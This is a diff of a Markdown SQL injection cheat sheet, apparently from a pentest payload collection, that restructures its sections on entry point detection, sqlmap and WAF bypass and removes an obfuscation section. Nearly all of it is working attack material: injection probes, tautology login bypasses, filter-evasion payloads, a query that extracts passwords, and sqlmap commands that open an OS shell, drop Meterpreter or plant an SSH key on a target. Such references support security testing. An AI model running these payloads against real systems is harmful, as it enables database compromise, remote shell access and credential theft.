@@ -39,62 +39,64 @@ Attempting to manipulate SQL queries may have goals including:
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
-* [WAF Bypass](#waf-bypass)
+* [Generic WAF Bypass](#generic-waf-bypass)
+  * [White spaces alternatives](#white-spaces-alternatives)
+  * [No Comma Allowed](#no-comma-allowed)
+  * [No Equal Allowed](#no-equal-allowed)
+  * [Case modification](#case-modification)
+
 
 ## Entry point detection
 
 Detection of an SQL injection entry point
-Simple characters
 
-```sql
-'
-%27
-"
-%22
-#
-%23
-;
-%3B
-)
-Wildcard (*)
-&apos;  # required for XML content
-```
+* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
+  * Simple characters
+    ```sql
+    '
+    %27
+    "
+    %22
+    #
+    %23
+    ;
+    %3B
+    )
+    Wildcard (*)
+    &apos;  # required for XML content
+    ```
+  * Multiple encoding
+    ```sql
+    %%2727
+    %25%27
+    ```
+  * Unicode characters
+    ```
+    Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")
+    Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')
+    ```
 
-Multiple encoding
+* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
+  * Merging characters
+    ```sql
+    `+HERP
+    '||'DERP
+    '+'herp
+    ' 'DERP
+    '%20'HERP
+    '%2B'HERP
+    ```
+  * Logic Testing
+    ```sql
+    page.asp?id=1 or 1=1 -- true
+    page.asp?id=1' or 1=1 -- true
+    page.asp?id=1" or 1=1 -- true
+    page.asp?id=1 and 1=2 -- false
+    ```
 
-```sql
-%%2727
-%25%27
-```
+* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
 
-Merging characters
 
-```sql
-`+HERP
-'||'DERP
-'+'herp
-' 'DERP
-'%20'HERP
-'%2B'HERP
-```
-
-Logic Testing
-
-```sql
-page.asp?id=1 or 1=1 -- true
-page.asp?id=1' or 1=1 -- true
-page.asp?id=1" or 1=1 -- true
-page.asp?id=1 and 1=2 -- false
-```
-
-Weird characters
-
-```sql
-Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
-transformed into U+0022 QUOTATION MARK (")
-Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
-transformed into U+0027 APOSTROPHE (')
-```
 
 ## DBMS Identification
 
@@ -126,7 +128,10 @@ transformed into U+0027 APOSTROPHE (')
 ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ```
 
+
 ## SQL injection using SQLmap
+
+[sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers.
 
 ### Basic arguments for SQLmap
 
@@ -156,19 +161,11 @@ sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrat
 
 ### Shell
 
-```powershell
-SQL Shell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
+* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
+* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
+* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
+* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
 
-Simple Shell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
-
-Dropping a reverse-shell / meterpreter
-python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
-
-SSH Shell by dropping an SSH key
-python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
-```
 
 ### Crawl a website with SQLmap and auto-exploit
 
@@ -429,49 +426,45 @@ Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL
 After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
 ```
 
-## WAF Bypass
+
+## Generic WAF Bypass
 
 ### White spaces alternatives
 
-No Space (%20) - bypass using whitespace alternatives
+* No space allowed (`%20`) - bypass using whitespace alternatives
+  ```sql
+  ?id=1%09and%091=1%09--
+  ?id=1%0Dand%0D1=1%0D--
+  ?id=1%0Cand%0C1=1%0C--
+  ?id=1%0Band%0B1=1%0B--
+  ?id=1%0Aand%0A1=1%0A--
+  ?id=1%A0and%A01=1%A0--
+  ```
+* No whitespace - bypass using comments
+  ```sql
+  ?id=1/*comment*/and/**/1=1/**/--
+  ```
+* No Whitespace - bypass using parenthesis
+  ```sql
+  ?id=(1)and(1)=(1)--
+  ```
+* Whitespace alternatives by DBMS
+  ```sql
+  -- Example of query where spaces were replaced by ascii characters above 0x80
+  ♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
+  ```
 
-```sql
-?id=1%09and%091=1%09--
-?id=1%0Dand%0D1=1%0D--
-?id=1%0Cand%0C1=1%0C--
-?id=1%0Band%0B1=1%0B--
-?id=1%0Aand%0A1=1%0A--
-?id=1%A0and%A01=1%A0--
-```
-
-No Whitespace - bypass using comments
-
-```sql
-?id=1/*comment*/and/**/1=1/**/--
-```
-
-No Whitespace - bypass using parenthesis
-
-```sql
-?id=(1)and(1)=(1)--
-```
-
-Whitespace alternatives by DBMS
-| DBMS | ASCII characters in hexadicimal |
-| ---- | ------------------------------- |
-| SQLite3 | 0A, 0D, 0C, 09, 20 |
-| MySQL	5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL	3	| 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| DBMS       | ASCII characters in hexadicimal |
+| ---------- | ------------------------------- |
+| SQLite3    | 0A, 0D, 0C, 09, 20 |
+| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
+| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
 | PostgreSQL | 0A, 0D, 0C, 09, 20 |
 | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
-| MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
 
-Example of query where spaces were replaced by ascii characters above 0x80
-```
-♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
-```
  
-### No Comma
+### No Comma Allowed
  
 Bypass using OFFSET, FROM and JOIN
 
@@ -481,7 +474,8 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
-### No Equal
+
+### No Equal Allowed
 
 Bypass using LIKE/NOT IN/IN/BETWEEN
 
@@ -492,128 +486,24 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
 ?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
+
 ### Case modification
  
-Bypass using uppercase/lowercase (see keyword AND)
+* Bypass using uppercase/lowercase (see keyword AND)
+  ```sql
+  ?id=1 AND 1=1#
+  ?id=1 AnD 1=1#
+  ?id=1 aNd 1=1#
+  ```
+* Bypass using keywords case insensitive / Bypass using an equivalent operator
+  ```sql
+  AND   -> &&
+  OR    -> ||
+  =     -> LIKE,REGEXP, BETWEEN, not < and not >
+  > X   -> not between 0 and X
+  WHERE -> HAVING
+  ```
 
-```sql
-?id=1 AND 1=1#
-?id=1 AnD 1=1#
-?id=1 aNd 1=1#
-```
-
-Bypass using keywords case insensitive / Bypass using an equivalent operator
-
-```sql
-AND   -> &&
-OR    -> ||
-=     -> LIKE,REGEXP, BETWEEN, not < and not >
-> X   -> not between 0 and X
-WHERE -> HAVING
-```
-
-### Obfuscation by DBMS
-
-MySQL
-```
-1.UNION	SELECT	2	
-3.2UNION	SELECT	2	
-1e0UNION	SELECT	2	
-SELECT\N/0.e3UNION	SELECT	2	
-1e1AND-0.0UNION	SELECT	2	
-1/*!12345UNION/*!31337SELECT/*!table_name*/	
-{ts	1}UNION	SELECT.``	1.e.table_name	
-SELECT	$.``	1.e.table_name	
-SELECT{_	.``1.e.table_name}	
-SELECT	LightOS	.	``1.e.table_name	LightOS	
-SELECT	information_schema 1337.e.tables	13.37e.table_name	
-SELECT	1	from	information_schema 9.e.table_name
-```
-
-MSSQL
-```
-.1UNION	SELECT	2	
-1.UNION	SELECT.2alias	
-1e0UNION	SELECT	2	
-1e1AND-1=0.0UNION	SELECT	2	
-SELECT	0xUNION	SELECT	2	
-SELECT\UNION	SELECT	2	
-\1UNION	SELECT	2	
-SELECT	1FROM[table]WHERE\1=\1AND\1=\1	
-SELECT"table_name"FROM[information_schema].[tables]	
-```
-
-Oracle
-```
-1FUNION	SELECT	2	
-1DUNION	SELECT	2	
-SELECT	0x7461626c655f6e616d65	FROM	all_tab_tables
-SELECT	CHR(116)	||	CHR(97)	||	CHR(98)	FROM	all_tab_tables
-SELECT%00table_name%00FROM%00all_tab_tables
-```
-
-### More MySQL specific
-
-`information_schema.tables` alternative
-
-```sql
-select * from mysql.innodb_table_stats;
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
-| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
-...
-+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
-
-mysql> show tables in dvwa;
-+----------------+
-| Tables_in_dvwa |
-+----------------+
-| guestbook      |
-| users          |
-+----------------+
-```
-
-Version Alternative
-
-```sql
-mysql> select @@innodb_version;
-+------------------+
-| @@innodb_version |
-+------------------+
-| 5.6.31           |
-+------------------+
-
-mysql> select @@version;
-+-------------------------+
-| @@version               |
-+-------------------------+
-| 5.6.31-0ubuntu0.15.10.1 |
-+-------------------------+
-
-mysql> mysql> select version();
-+-------------------------+
-| version()               |
-+-------------------------+
-| 5.6.31-0ubuntu0.15.10.1 |
-+-------------------------+
-```
-
-#### WAF bypass for MySQL using scientific notation
-
-Blocked
-```sql
-' or ''='
-```
-Working
-```sql
-' or 1.e('')='
-```
-Obfuscated query
-```sql
-1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
-```
 
 ## Labs 
 
